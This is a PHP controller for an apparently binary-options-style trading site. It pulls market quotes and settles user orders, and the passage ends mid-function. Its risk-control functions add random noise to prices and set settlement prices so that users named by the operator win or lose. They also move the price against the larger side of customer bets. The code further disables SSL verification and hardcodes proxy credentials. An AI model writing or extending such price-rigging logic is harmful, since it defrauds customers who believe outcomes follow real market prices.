<?php 
namespace app\index\controller;
use think\Controller;
use think\Db;

class Api extends Controller{

	public function __construct(){
		parent::__construct();

		$this->nowtime = time();
		$minute = date('Y-m-d H:i',$this->nowtime).':00';
		$this->minute = strtotime($minute);


		$this->user_win = array();//指定客户赢利
		$this->user_loss = array();//指定客户亏损
		
		//K线数据库
		$this->klinedata = db('klinedata');


	}
	public function getdate()
	{
		//产品列表
		$pro = db('productinfo')->where('isdelete',0)->select();
		if(!isset($pro)) return false;
		$nowtime = time();
        $_rand = rand(1, 900) / 100000;
        $thisdatas = array();

        $arrContextOptions=array(
			"ssl"=>array(
				"verify_peer"=>false,
				"verify_peer_name"=>false,
			),
		); 

	    foreach ($pro as $k => $v) {

            if (intval($v['cid']) == 6) {
                $symbol = strtoupper($v['procode']);
                
                // 使用 lbuul.cn API 的加密货币
                if (strtolower($v['procode']) === 'btcusd' || strtolower($v['procode']) === 'ethusd' || 
                    strtolower($v['procode']) === 'trxusd' || strtolower($v['procode']) === 'bchusd' || 
                    strtolower($v['procode']) === 'solusd' || strtolower($v['procode']) === 'xautusd' || 
                    strtolower($v['procode']) === 'dogeusd' || strtolower($v['procode']) === 'linkusd' || 
                    strtolower($v['procode']) === 'adausd' || strtolower($v['procode']) === 'xrpusd' || 
                    strtolower($v['procode']) === 'ltcusd') {
                    $to = time();
                    $from = $to - (24 * 60 * 60); // 获取最近24小时数据
                    
                    // 根据币种选择不同的currency_match_id
                    $symbol = strtolower($v['procode']);
                    $currency_match_map = [
                        'btcusd'  => ['id' => 3,  'symbol' => 'BTC%2FUSDT'],
                        'ethusd'  => ['id' => 4,  'symbol' => 'ETH%2FUSDT'],
                        'trxusd'  => ['id' => 70, 'symbol' => 'TRX%2FUSDT'],
                        'bchusd'  => ['id' => 28, 'symbol' => 'BCH%2FUSDT'],
                        'solusd'  => ['id' => 76, 'symbol' => 'SOL%2FUSDT'],
                        'xautusd' => ['id' => 86, 'symbol' => 'XAUT%2FUSDT'],
                        'dogeusd' => ['id' => 60, 'symbol' => 'DOGE%2FUSDT'],
                        'linkusd' => ['id' => 61, 'symbol' => 'LINK%2FUSDT'],
                        'adausd'  => ['id' => 69, 'symbol' => 'ADA%2FUSDT'],
                        'xrpusd'  => ['id' => 11, 'symbol' => 'XRP%2FUSDT'],
                        'ltcusd'  => ['id' => 23, 'symbol' => 'LTC%2FUSDT']
                    ];
                    
                    $currency_match_id = isset($currency_match_map[$symbol]) ? $currency_match_map[$symbol]['id'] : 3;
                    $symbol_name = isset($currency_match_map[$symbol]) ? $currency_match_map[$symbol]['symbol'] : 'BTC%2FUSDT';
                    
                    $url = 'https://api.lbuul.cn/api/market/kline?symbol='.$symbol_name.'&currency_match_id='.$currency_match_id.'&period=1day&from='.$from.'&to='.$to;
                    $resp = $this->curlfun($url, array(), 'GET');
                    
                    // 添加调试日志
                    file_put_contents('debug_api_'.$symbol.'.log', date('Y-m-d H:i:s')." URL: ".$url."\nResponse: ".$resp."\n\n", FILE_APPEND);
                    
                    $json = json_decode($resp, true);
                    
                    if (isset($json['data']) && is_array($json['data']) && !empty($json['data'])) {
                        $data_arr = end($json['data']); // 取最后一条
                        
                        $thisdata['Price'] = $this->fengkong($data_arr['close'], $v);
                        $thisdata['Open'] = $data_arr['open'];
                        $thisdata['Close'] = $data_arr['close'];
                        $thisdata['High'] = $data_arr['high'];
                        $thisdata['Low'] = $data_arr['low'];
                        
                        $thisdata['Diff'] = $thisdata['Price']-$thisdata['Open'];
                        $thisdata['DiffRate'] = (string)round((($thisdata['Price']-$thisdata['Open'])/$thisdata['Open']*100),2).'%';
                        $thisdata['Name'] = $v['ptitle'];
                    }
                } else {
                    // 其他虚拟币仍使用Binance/MEXC
                    $rows = null;
                    $binBases = array('https://api.binance.com','https://api1.binance.com','https://api2.binance.com','https://api3.binance.com');
                    foreach ($binBases as $base) {
                        $url = $base.'/api/v3/klines?symbol='.$symbol.'&interval=1d&limit=1';
                        $resp = $this->curlfun($url,array(),'GET');
                        $tmp  = json_decode($resp,true);
                        if (is_array($tmp)) { $rows = $tmp; break; }
                    }
                    if(!$rows){
                        $url = 'https://api.mexc.com/api/v3/klines?symbol='.$symbol.'&interval=1d&limit=1';
                        $resp = $this->curlfun($url,array(),'GET');
                        $rows = json_decode($resp,true);
                    }
                    /* ------------------虚拟币------------------------*/                                            
                    foreach ($rows as $data_arr) {
                            // [openTime, open, high, low, close, volume, closeTime, ...]
            		        $thisdata['Price'] = $this->fengkong($data_arr[4], $v);
                            $thisdata['Open'] = $data_arr[1];
                            $thisdata['Close'] = $data_arr[4];
                            $thisdata['High'] = $data_arr[2];
                            $thisdata['Low']= $data_arr[3];
    
                            $thisdata['Diff'] = $thisdata['Price']-$thisdata['Open'];
                            $thisdata['DiffRate'] = (string)round((($thisdata['Price']-$thisdata['Open'])/$thisdata['Open']*100),2).'%';
                            $thisdata['Name'] = $v['ptitle'];
            		}
                }
        	
            } else if(intval($v['cid']) == 7 ){
                /* ------------------ 新浪贵金属------------------------*/
                $url = "http://hq.sinajs.cn/list=" . $v['procode'];
                //$url = "https://w.sinajs.cn/rn=".time()."&list=".$v['procode'];
                $getdata = $this->curlfunS($url);
                
                //file_put_contents('log.txt',print_r($getdata,1));
                $data_arr = explode(',', $getdata);
                //file_put_contents('log.txt',print_r($data_arr,1));
                if (!is_array($data_arr) || count($data_arr)<2) continue;
                //$thisdata['Price'] =sprintf('%.2f',$this->fengkong($data_arr[1], $v));

                //1买入价，2卖出价格，6最高价，7最低价，3昨收，5今开
				$__bid = floatval($data_arr[1]);
				$__ask = floatval($data_arr[2]);
				$__mid = ($__bid + $__ask) / 2.0;
				$thisdata['Price'] = sprintf('%.4f',$__mid);
                $thisdata['Open'] = $data_arr[5];
                $thisdata['Close'] = $data_arr[3];
                $thisdata['High'] = $data_arr[6];
                $thisdata['Low'] = $data_arr[7];
                $thisdata['Diff'] = $data_arr[12];
                $thisdata['DiffRate'] = (string)round((($thisdata['Price']-$thisdata['Open'])/$thisdata['Open']*100),2).'%';
                
                
                
            }else if(intval($v['cid']) == 1 ){
                 /* ------------------ 新浪原油------------------------*/
                $url = "https://w.sinajs.cn/?_=".$nowtime."/&list=".$v['procode'];
                
				$getdata = $this->curlfunS($url);
				

				
				$data_arr = explode(',',$getdata);
				
				if(!is_array($data_arr) || count($data_arr) <2) continue;
				//$thisdata['Price'] = $this->fengkong($data_arr[1],$v);
				$now_price=explode('="',$data_arr[0]);
				$now_price=$this->fengkong($now_price[1],$v);
				$thisdata['Price'] = $now_price;
				$thisdata['Open'] = $data_arr[8];
				$thisdata['Close'] = $data_arr[7];
				$thisdata['High'] = $data_arr[4];
				$thisdata['Low'] = $data_arr[5];
				$thisdata['Diff'] = 0;
				$thisdata['DiffRate'] = (string)round((($now_price-$data_arr[8])/$data_arr[8]*100),2).'%';
				
                
            }else if(intval($v['cid']) == 8){
                $url = "https://w.sinajs.cn/?_=".$nowtime."/&list=".$v['procode'];
                
				$getdata = $this->curlfunS($url);
			
				$data_arr = explode(',',$getdata);
				
				if($v['procode']=="nf_Y0"){
                    file_put_contents('log_date.txt',print_r($getdata,1));
                    file_put_contents('log_data_arr.txt',print_r($data_arr,1));
                }
				
				if(!is_array($data_arr) || count($data_arr) <2) continue;
				//$thisdata['Price'] = $this->fengkong($data_arr[1],$v);

				$thisdata['Price'] = $this->fengkong($data_arr[5],$v);
				$thisdata['Open'] = $data_arr[2];
				$thisdata['Close'] = $data_arr[10];
				$thisdata['High'] = $data_arr[3];
				$thisdata['Low'] = $data_arr[4];
				$thisdata['Diff'] = 0;
				$thisdata['DiffRate'] = (string)round((($thisdata['High']-$thisdata['Low'])/$thisdata['Close']*100),2).'%';
            }else if(intval($v['cid']) == 5){
                 /* ------------------ 新浪外汇------------------------*/
                $url = "http://hq.sinajs.cn/list=".$v['procode'];
				$getdata = $this->curlfunS($url);
				$data_arr = explode(',',$getdata);
				
				// 特殊处理CNH/USD - 如果主代码失败，尝试备用代码
				if((!is_array($data_arr) || count($data_arr)<2) && $v['ptitle'] == 'CNH/USD'){
				    $backup_codes = ['fx_scnhusd', 'fx_cnhusd', 'fx_usdcnh'];
				    foreach($backup_codes as $backup_code){
				        $url = "http://hq.sinajs.cn/list=".$backup_code;
				        $getdata = $this->curlfunS($url);
				        $data_arr = explode(',',$getdata);
				        if(is_array($data_arr) && count($data_arr)>=8){
				            // 成功找到备用数据源
				            break;
				        }
				    }
				}
				
				// 特殊处理USD/CNH - 如果主代码失败，尝试备用代码
				if((!is_array($data_arr) || count($data_arr)<2) && $v['ptitle'] == 'USD/CNH'){
				    $backup_codes = ['fx_usdcnh', 'fx_susdcnh', 'fx_scnhusd'];
				    foreach($backup_codes as $backup_code){
				        $url = "http://hq.sinajs.cn/list=".$backup_code;
				        $getdata = $this->curlfunS($url);
				        $data_arr = explode(',',$getdata);
				        if(is_array($data_arr) && count($data_arr)>=8){
				            // 成功找到备用数据源
				            break;
				        }
				    }
				}
				
				if(!is_array($data_arr) || count($data_arr)<2) continue;
				//$thisdata['Price'] = $this->fengkong($data_arr[1],$v);
				$thisdata['Price'] = $this->fengkong($data_arr[1],$v);
				$thisdata['Open'] = isset($data_arr[5]) ? $data_arr[5] : $data_arr[1];
				$thisdata['Close'] = isset($data_arr[3]) ? $data_arr[3] : $data_arr[1];
				$thisdata['High'] = isset($data_arr[6]) ? $data_arr[6] : $data_arr[1];
				$thisdata['Low'] = isset($data_arr[7]) ? $data_arr[7] : $data_arr[1];
				$thisdata['Diff'] = isset($data_arr[12]) ? $data_arr[12] : 0;
				$thisdata['DiffRate'] = (string)round((($thisdata['Price']-$thisdata['Open'])/$thisdata['Open']*100),4).'%';
            }
            $thisdata['Name'] = $v['ptitle'];
            $thisdata['UpdateTime'] = $nowtime;
            $thisdata['pid'] = $v['pid'];
            $thisdatas[$v['pid']] = $thisdata;

            //dump($thisdata);exit();
            Db::name('productdata')->where(['pid'=>$v['pid']])->update($thisdata);
        }
        cache('nowdata', $thisdatas);
		
	}


	/**
	 * 数据风控
	 * @author lukui  2017-06-27
	 * @param  [type] $price [description]
	 * @param  [type] $pro   [description]
	 * @return [type]        [description]
	 */
	public function fengkong($price,$pro)
	{
		
		$point_low = $pro['point_low'];
		$point_top = $pro['point_top'];
		
		$FloatLength = getFloatLength($point_top);
		$jishu_rand = pow(10,$FloatLength);
		$point_low = $point_low * $jishu_rand;
		$point_top = $point_top * $jishu_rand;
		$rand = rand($point_low,$point_top)/$jishu_rand;
		
		$_new_rand = rand(0,10);
		if($_new_rand % 2 == 0){
			$price = $price + $rand;
		}else{
			$price = $price - $rand;
		}
		return $price;
	}




	//curl获取数据
	public function curlfun($url, $params = array(), $method = 'GET')
	{
		$header = array();
		$opts = array(
			CURLOPT_TIMEOUT => 30,
			CURLOPT_RETURNTRANSFER => true,
			CURLOPT_SSL_VERIFYPEER => false,
			CURLOPT_SSL_VERIFYHOST => false,
			CURLOPT_HTTPHEADER => $header,
			CURLOPT_CONNECTTIMEOUT => 10, // 连接超时设置为10秒
			CURLOPT_FOLLOWLOCATION => true, // 允许重定向
			CURLOPT_MAXREDIRS => 3 // 最多重定向3次
		);

		// 根据请求方法设置特定选项
		switch (strtoupper($method)) {
			case 'GET':
				$opts[CURLOPT_URL] = $url . (strpos($url, '?') === false ? '?' : '&') . http_build_query($params);
				break;
			case 'POST':
				$opts[CURLOPT_URL] = $url;
				$opts[CURLOPT_POST] = true;
				$opts[CURLOPT_POSTFIELDS] = http_build_query($params);
				break;
			default:
				$opts[CURLOPT_URL] = $url;
				break;
		}

		// 初始化curl
		$ch = curl_init();
		curl_setopt_array($ch, $opts);
		$result = curl_exec($ch);
		$error = curl_error($ch);
		$errno = curl_errno($ch);
		
		// 记录错误信息
		if ($error) {
			file_put_contents('curl_error.log', date('Y-m-d H:i:s')." URL: ".$url."\nError: ".$error." (".$errno.")\n\n", FILE_APPEND);
			return '{"code":-1,"msg":"curl error: '.$error.'"}';
		}
		
		curl_close($ch);
		return $result;
	}

    //curl获取数据
	public function curlfun1($url, $params = array(), $method = 'GET') {
    $header = array();
    $opts = array(
        CURLOPT_TIMEOUT => 10, 
        CURLOPT_RETURNTRANSFER => 1, 
        CURLOPT_SSL_VERIFYPEER => false, 
        CURLOPT_SSL_VERIFYHOST => false, 
        CURLOPT_HTTPHEADER => $header
    );
    /* 根据请求类型设置特定参数 */
    switch (strtoupper($method)) {
        case 'GET' :
        $opts[CURLOPT_URL] = $url . '?' . http_build_query($params);
        $opts[CURLOPT_URL] = substr($opts[CURLOPT_URL],0,-1);
        break;
    case 'POST' :
        //判断是否传输文件
        $params = http_build_query($params);
            $opts[CURLOPT_URL] = $url;
            $opts[CURLOPT_POST] = 1;
            $opts[CURLOPT_POSTFIELDS] = $params;
            break;
    default :
        break;
    }
    /* 初始化并执行curl请求 */
    $ch = curl_init();
    curl_setopt_array($ch, $opts);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
    curl_setopt($ch, CURLOPT_PROXY, "123.58.209.163:7878"); //Socks5 IP和端口
    curl_setopt($ch,CURLOPT_PROXYUSERPWD, "test1:123456"); //Socks5 账号密码
    $data = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);
    if($error){
        $data = null;
    }        
    return $data;
    }


	/**
	 * 全局平仓
	 * @return [type] [description]
	 */
	public function order()
	{
		$nowtime = time();
		$kong_end = getconf('kong_end');
		$kong_end_arr = explode('-',$kong_end );
		if(count($kong_end_arr) == 2){
			$s_rand = rand($kong_end_arr[0],$kong_end_arr[1]);
		}else{
			$s_rand = rand(6,12);
		}
		
		$db_order = db('order');
		$db_userinfo = db('userinfo');
		//订单列表
		$map['ostaus'] = 0;
		$map['selltime'] = array('elt',$nowtime+$s_rand );
		$_orderlist = $db_order->where($map)->order('selltime asc')->limit('0,50')->select();
		
		//dump($_orderlist);
		

		$data_info = db('productinfo');

		

		//风控参数
		$risk = db('risk')->find();

		//此刻产品价格
		$p_map['isdelete'] = 0;
		$pro = db('productdata')->field('pid,Price')->where($p_map)->select();
		$prodata = array();
		foreach ($pro as $k => $v) {
			
			$_pro = cache('nowdata');
			
			if(!isset($_pro[$v['pid']])){
				$prodata[$v['pid']] = $v['Price'];
				continue;
			}

			$prodata[$v['pid']] = $this->order_type($_orderlist,$_pro[$v['pid']],$risk,$data_info);
			// dump($prodata);
			//echo '---------------------------------------------------<br>';
		}
		//exit;
		//订单列表
		$map['ostaus'] = 0;
		$map['selltime'] = array('elt',$nowtime);
		$orderlist = $db_order->where($map)->limit(0,50)->select();
		
		//exit;
		if(!$orderlist){
			return false;
		}

		//循环处理订单
		$nowtime = time();
		foreach ($orderlist as $k => $v) {

			//此刻可平仓价位
			$sellprice = isset($prodata[$v['pid']])?$prodata[$v['pid']]:0;
			if($sellprice == 0){
				continue;
			}
			//买入价
			$buyprice = $v['buyprice'];
			$fee = $v['fee'];

			$order_cha = round(floatval($sellprice)-floatval($buyprice),6);
			
			//买涨
			if($v['ostyle'] == 0 && $nowtime >= $v['selltime']){

				if($order_cha > 0){  //盈利
					$yingli = $v['fee']*($v['endloss']/100);
					$d_map['is_win'] = 1;
					
					//平仓增加用户金额
                   	$u_add = $yingli + $fee;
                   	$db_userinfo->where('uid',$v['uid'])->setInc('usermoney',$u_add);

                   	//写入日志
                   	$this->set_order_log($v,$u_add);


				}elseif($order_cha < 0){	//亏损
				
				    $kuishun = $v['fee']*($v['endloss']/100);  //输赢亏损
				    $d_map['is_win'] = 2;
				    
				    //平仓增加用户金额
				    $u_add =  $fee-$kuishun; 
                   	$db_userinfo->where('uid',$v['uid'])->setInc('usermoney',$u_add);

				    $yingli = -1*$kuishun;   
				    //$yingli = -1*$v['fee'];   //输掉本金
					
					$this->set_order_log($v,$u_add);

				}else{		//无效
					$yingli = 0;
					$d_map['is_win'] = 3;

					//平仓增加用户金额
                   	$u_add = $fee;
                   	$db_userinfo->where('uid',$v['uid'])->setInc('usermoney',$u_add);
                   	//写入日志
                   	$this->set_order_log($v,$u_add);
				}

				//平仓处理订单
				$d_map['ostaus'] = 1;
				$d_map['sellprice'] = $sellprice;
				$d_map['ploss'] = $yingli;
				$d_map['oid'] = $v['oid'];
				db('order')->update($d_map);




			//买跌
			}elseif($v['ostyle']==1 && $nowtime >= $v['selltime']){



				if($order_cha < 0){  //盈利
					$yingli = $v['fee']*($v['endloss']/100);
					$d_map['is_win'] = 1;
					

					//平仓增加用户金额
                   	$u_add = $yingli + $fee;
                   	$db_userinfo->where('uid',$v['uid'])->setInc('usermoney',$u_add);

                   	//写入日志
                   	$this->set_order_log($v,$u_add);


				}elseif($order_cha > 0){	//亏损
				
				    $kuishun = $v['fee']*($v['endloss']/100);
					$d_map['is_win'] = 2;
					
				    //$u_add =  $fee-$kuishun;
				    $u_add =  $fee-$kuishun; 
                   	$db_userinfo->where('uid',$v['uid'])->setInc('usermoney',$u_add);

				    $yingli = -1*$kuishun;
				    
				    //写入日志
					$this->set_order_log($v,$u_add);

				}else{		//无效
					$yingli = 0;
					$d_map['is_win'] = 3;

					//平仓增加用户金额
                   	$u_add = $fee;
                   	$db_userinfo->where('uid',$v['uid'])->setInc('usermoney',$u_add);
                   	//写入日志
                   	$this->set_order_log($v,$u_add);
				}

				//平仓处理订单
				$d_map['ostaus'] = 1;
				$d_map['sellprice'] = $sellprice;
				$d_map['ploss'] = $yingli;
				$d_map['oid'] = $v['oid'];
				$db_order->update($d_map);



			}



		}
		
	}



	/**
	 * 写入平仓日志
	 * @author lukui  2017-07-01
	 * @param  [type] $v        [description]
	 * @param  [type] $addprice [description]
	 */
	public function set_order_log($v,$addprice)
	{
		$o_log['uid'] = $v['uid'];
       	$o_log['oid'] = $v['oid'];
       	$o_log['addprice'] = $addprice;
       	$o_log['addpoint'] = 0;
       	$o_log['time'] = time();
       	$o_log['user_money'] = db('userinfo')->where('uid',$v['uid'])->value('usermoney');
       	db('order_log')->insert($o_log);

       	//资金日志
       	set_price_log($v['uid'],1,$addprice,'结单','订单到期获利结算',$v['oid'],$o_log['user_money']);
	}


	/**
	 * 订单类型
	 * @param  [type] $orders [description]
	 * @return [type]         [description]
	 */
	public function order_type($orders,$pro,$risk,$data_info)
	{
		

		$_prcie = $pro['Price'];

		$pid = $pro['pid'];
		$thispro = array();		//买此产品的用户
		

		//此产品购买人数
		$price_num = 0;
		//买涨金额，计算过盈亏比例以后的
		$up_price = 0;
		//买跌金额，计算过盈亏比例以后的
		$down_price = 0;
		//买入最低价
		$min_buyprice = 0;
		//买入最高价
		$max_buyprice = 0;
		//下单最大金额
		$max_fee = 0;
		//指定客户亏损
		$to_win = explode('|',$risk['to_win']);
		$to_win = array_filter(array_merge($to_win,$this->user_win));
		$is_to_win = array();
		//指定客户亏损
		$to_loss = explode('|',$risk['to_loss']);
		$to_loss = array_filter(array_merge($to_loss,$this->user_loss));
		$is_to_loss = array();



		$i = 0;

		foreach ($orders as $k => $v) {

			if($v['pid'] == $pid ){
				//没炒过最小风控值直接退出price
				if ($v['fee'] < $risk['min_price']) {
					//return $pro['Price'];
				}
				$i++;


				
				//单控 赢利  
				if($v['kong_type'] == '1' || $v['kong_type'] == '3'){
					$dankong_ying = $v;
					break;
				}

				
				//单控 亏损  
				if($v['kong_type'] == '2'){

					$dankong_kui = $v;
					break;
				}
				//dump($v['kong_type']);
				//是否存在指定盈利
				if(in_array($v['uid'], $to_win)){
					$is_to_win = $v;
					break;
					
				}
				//是否存在指定亏损
				if(in_array($v['uid'], $to_loss)){
					$is_to_loss = $v;
					break;
					
				}

				//总下单人数
				$price_num++;
				//买涨买跌累加
				if($v['ostyle'] == 0){
					$up_price += $v['fee']*$v['endloss']/100;
				}else{
					$down_price += $v['fee']*$v['endloss']/100;
				}
				//统计最大买入价与最大下单价
				if($i == 1){
					$min_buyprice = $v['buyprice'];
					$max_buyprice = $v['buyprice'];
					$max_fee = $v['fee'];
				}else{
					if($min_buyprice > $v['buyprice']){
						$min_buyprice = $v['buyprice'];
						
					}
					if($max_buyprice < $v['buyprice']){
						$max_buyprice = $v['buyprice'];
					}
					if($max_fee < $v['fee']){
						$max_fee = $v['fee'];
					}
				}
			}

		}

		// if(isset($orders[0]) && isset($max_buyprice)){
		// 	if($orders[0]['buyprice'] > $max_buyprice){
		// 		$max_buyprice = $orders[0]['buyprice'];
		// 	}
		// }
		// if(isset($orders[0]) && isset($min_buyprice)){
		// 	if($orders[0]['buyprice'] < $min_buyprice){
		// 		$min_buyprice = $orders[0]['buyprice'];
		// 	}
		// }



		// if( $pid == 12){

		
		// dump('$pid:'.$pid);
		// dump('$price_num:'.$price_num);
		// dump('$up_price:'.$up_price);
		// dump('$down_price:'.$down_price);
		// dump('$min_buyprice:'.$min_buyprice);
		// dump('$max_buyprice:'.$max_buyprice);
		// dump('$max_fee:'.$max_fee);

		// }
		$proinfo = $data_info->where('pid',$pro['pid'])->find();
		//根据现在的价格算出风控点
		$FloatLength = getFloatLength((float)$pro['Price']);

		if($FloatLength == 0){
			$FloatLength = getFloatLength($proinfo['point_top']);
		}

		//是否存在指定盈利
		$is_do_price = 0; 	//是否已经操作了价格

		$jishu_rand = pow(10,$FloatLength);
		$beishu_rand = rand(1,10);

		$data_rands = $data_info->where('pid',$pro['pid'])->value('rands');
		
		$data_randsLength = getFloatLength($data_rands);
		if($data_randsLength > 0){
			$_j_rand = pow(10,$data_randsLength)*$data_rands;
			$_s_rand = rand(1,$_j_rand)/pow(10,$data_randsLength);

		}else{
			$_s_rand = 0;
			
		}
		

		$do_rand = $_s_rand;
		
		//if($pro['pid'] == 12) dump($do_rand);


		

		//先考虑单控
		if(!empty($dankong_ying) && $is_do_price == 0){ 		//单控 1赢利
			if($dankong_ying['ostyle'] == 0 ){
				$pro['Price'] = $v['buyprice'] + $do_rand;
			}elseif($dankong_ying['ostyle'] == 1 ){
				$pro['Price'] = $v['buyprice'] - $do_rand;
			}
			$is_do_price = 1;
			//echo 1;
		}

		if(!empty($dankong_kui) && $is_do_price == 0){ 		//单控 2亏损
			if($dankong_kui['ostyle'] == 0  ){
				$pro['Price'] = $v['buyprice'] - $do_rand;
			}elseif($dankong_kui['ostyle'] == 1 ){
				$pro['Price'] = $v['buyprice'] + $do_rand;
			}
			
			//echo 2;
			$is_do_price = 1;
		}

		//指定客户赢利
		if(!empty($is_to_win) && $is_do_price == 0){
			
			if($is_to_win['ostyle'] == 0 ){
				$pro['Price'] = $v['buyprice'] + $do_rand;
			}elseif($is_to_win['ostyle'] == 1 ){
				$pro['Price'] = $v['buyprice'] - $do_rand;
			}
			$is_do_price = 1;
			////echo 1;
			//echo 3;
			
		}
		//是否存在指定亏损
		if(!empty($is_to_loss) && $is_do_price == 0){

			
			if($is_to_loss['ostyle'] == 0 ){
				$pro['Price'] = $v['buyprice'] - $do_rand;
			}elseif($is_to_loss['ostyle'] == 1 ){
				$pro['Price'] = $v['buyprice'] + $do_rand;
			}
			$is_do_price = 1;
			//echo 4;
		}
		//没有任何下单记录
		if($up_price == 0 && $down_price == 0 && $is_do_price == 0){
			$is_do_price = 2;
			//return $pro['Price'];
		}
		
		//只有一个人下单，或者所有人下单买的方向相同
		if(( ($up_price == 0 && $down_price != 0) || ($up_price != 0 && $down_price == 0) )  && $is_do_price == 0 ){

			//风控参数
			$chance = $risk["chance"];
			$chance_1 = explode('|',$chance);
			$chance_1 = array_filter($chance_1);
			//循环风控参数
			if(count($chance_1) >= 1){
				foreach ($chance_1 as $key => $value) {
					//切割风控参数
					$arr_1 = explode(":",$value);
					$arr_2 = explode("-",$arr_1[0]);
					//比较最大买入价格
					if($max_fee >= $arr_2[0] && $max_fee < $arr_2[1]){
						//得出风控百分比
						if(!isset($arr_1[1])){
							$chance_num = 30;
						}else{
							$chance_num = $arr_1[1];
						}
						
						$_rand = rand(1,100);
						continue;
						
					}
					
				}
			}

			
			
			
			//买涨
			if(isset($_rand) && $up_price != 0){

				if($_rand > $chance_num){	//客损
					$pro['Price'] = $min_buyprice-$do_rand;

					// if( abs($pro['Price'] - $_prcie) > $proinfo['point_top']){
					// 	$pro['Price'] = $_prcie - ($proinfo['point_top'] + rand(100,999)/1000);
					// }
					
					$is_do_price = 1;
					//echo 5;
				}else{		//客赢
					$pro['Price'] = $max_buyprice+$do_rand;
					// if( abs($pro['Price'] - $_prcie) > $proinfo['point_top']){
					// 	$pro['Price'] = $_prcie + ($proinfo['point_top'] + rand(100,999)/1000);
					// }
					$is_do_price = 1;
					//echo 6;
				}
				
			}
			
			if(isset($_rand) && $down_price != 0){

				if($_rand > $chance_num){	//客损
					$pro['Price'] = $max_buyprice+$do_rand;
					// if( abs($pro['Price'] - $_prcie) > $proinfo['point_top']){
					// 	$pro['Price'] = $_prcie + ($proinfo['point_top'] + rand(100,999)/1000);
					// }
					$is_do_price = 1;
					//echo 7;
				}else{		//客赢
					$pro['Price'] = $min_buyprice-$do_rand;
					// if( abs($pro['Price'] - $_prcie) > $proinfo['point_top']){
					// 	$pro['Price'] = $_prcie - ($proinfo['point_top'] + rand(100,999)/1000);
					// }
					$is_do_price = 1;
					//echo 8;
				}
				
			}

			

		}


		//多个人下单，并且所有人下单买的方向不相同
		if($up_price != 0 && $down_price != 0  && $is_do_price == 0){
			
			//买涨大于买跌的
			if ($up_price > $down_price) {
				$pro['Price'] = $min_buyprice-$do_rand;
				// if( abs($pro['Price'] - $_prcie) > $proinfo['point_top']){
				// 	$pro['Price'] = $_prcie - ($proinfo['point_top'] + rand(100,999)/1000);
				// }
				$is_do_price = 1;
				//echo 9;
				
			}
			//买涨小于买跌的
			if ($up_price < $down_price) {
				$pro['Price'] = $max_buyprice+$do_rand;
				// if( abs($pro['Price'] - $_prcie) > $proinfo['point_top']){
				// 	$pro['Price'] = $_prcie + ($proinfo['point_top'] + rand(100,999)/1000);
				// }
				$is_do_price = 1;
				//echo 10;
			}
			if ($up_price == $down_price) {
				$is_do_price = 2;
			}
			
			
			
		}


		
		if($is_do_price == 2 || $is_do_price == 0){
			$pro['Price'] = $this->fengkong($pro['Price'],$proinfo);
		}
		//if( $pid == 12) dump($pro['Price']);
		
		db('productdata')->where('pid',$pro['pid'])->update($pro);

		//存储k线值
		$k_map['pid'] = $pro['pid'];
		$k_map['ktime'] = $this->minute;

		/* 此处多余--
		$issetkline = $this->klinedata->where($k_map)->find();
		
		if($issetkline){
			$nk_map['id'] = $issetkline['id'];
			if($issetkline['updata'] < $pro['Price']){
				$nk_map['updata'] = $pro['Price'];
				
			}
			if($issetkline['downdata'] > $pro['Price']){
				$nk_map['downdata'] = $pro['Price'];
				
			}
			$nk_map['closdata'] = $pro['Price'];
			$this->klinedata->update($nk_map);
		}else{
			$k_map['updata'] = $pro['Price'];
			$k_map['downdata'] = $pro['Price'];
			$k_map['opendata'] = $pro['Price'];
			$this->klinedata->insert($k_map);
		}

		

		
		if($pro['Price'] < $pro['Low']){
			$pro['Price'] = $pro['Low'];
		}
		if($pro['Price'] > $pro['High']){
			$pro['Price'] = $pro['High'];
		}
		*/
		return $pro['Price'];
		

	}
function my_sort($arrays,$sort_key,$sort_order=SORT_ASC,$sort_type=SORT_NUMERIC ){
		if(is_array($arrays)){
			foreach ($arrays as $array){
				if(is_array($array)){
					$key_arrays[] = $array[$sort_key];
				}else{
					return false;
				}
			}
		}else{
			return false;
		}
		array_multisort($key_arrays,$sort_order,$sort_type,$arrays);
		return $arrays;
	}


	/**
	 * 获取K线数据
	 * @author lukui  2017-07-01
	 * @return [type] [description]
	 */
	public function getkdata($pid=null,$num=null,$interval=null,$isres=null)
	{
		$pid = empty($pid) ? input('param.pid') : $pid;
        $num = empty($num) ? input('param.num') : $num;
        $num = empty($num) ? 30 : $num;
        $pro = GetProData($pid);
        $all_data = array();

        if (!$pro) {
            //echo 'data error!';
            exit;
        }
//        dump($pro);
        $interval = empty($interval) ? input('param.interval') : $interval;
        $interval = input('param.interval') ? input('param.interval') : 1;
        $nowtime = time() . rand(100, 999);

        
        // 特殊处理：XAU产品也使用加密货币API（原油继续使用新浪API+模拟兜底）
        $procode_lower = strtolower($pro['procode']);
        $is_crypto_api = ($pro['cid'] == 6) || 
                        (strpos($procode_lower, 'xau') !== false) || 
                        (strpos($procode_lower, 'gold') !== false);
        
        if ($is_crypto_api) {  //区块链，走货币
            
            switch ($interval) {
                case '1':
                    $datalen = "1min";
                    break;
                case '5':
                    $datalen = "5min";
                    break;
                case '15':
                    $datalen = "15min";
                    break;
                case '30':
                    $datalen = "30min";
                    break;
                case '60':
                    $datalen = "60min";
                    break;
                case 'd':
                    $datalen = "1day";
                    break;
                   
                default:
                    $datalen = "5min";
                    break;
            }
           
            
            $symbol = strtolower($pro['procode']);
            // 特殊处理：产品代码映射
            if ($symbol === 'hf_xau') {
                $symbol = 'xautusd';  // 黄金映射到XAUT/USDT
            }
            // 使用 lbuul.cn API 的加密货币
            if ($symbol === 'btcusd' || $symbol === 'ethusd' || $symbol === 'trxusd' || 
                $symbol === 'bchusd' || $symbol === 'solusd' || $symbol === 'xautusd' || $symbol === 'dogeusd' ||
                $symbol === 'linkusd' || $symbol === 'adausd' || $symbol === 'xrpusd' || $symbol === 'ltcusd') {
                // 根据interval选择合适的period
                $period_map = [
                    '1'   => '1min',
                    '5'   => '5min',
                    '15'  => '15min',
                    '30'  => '30min',
                    '60'  => '1hour',
                    'd'   => '1day'
                ];
                $period = isset($period_map[$interval]) ? $period_map[$interval] : '5min';
                
                // 计算时间范围 (当前时间往前推算足够的时间以获取足够数量的K线)
                $to = time();
                $from = $to - ($num * 60 * 60 * 24); // 预留足够时间
                
                // 根据币种选择不同的currency_match_id和symbol_name
                $currency_match_map = [
                    'btcusd'  => ['id' => 3,  'symbol' => 'BTC%2FUSDT'],
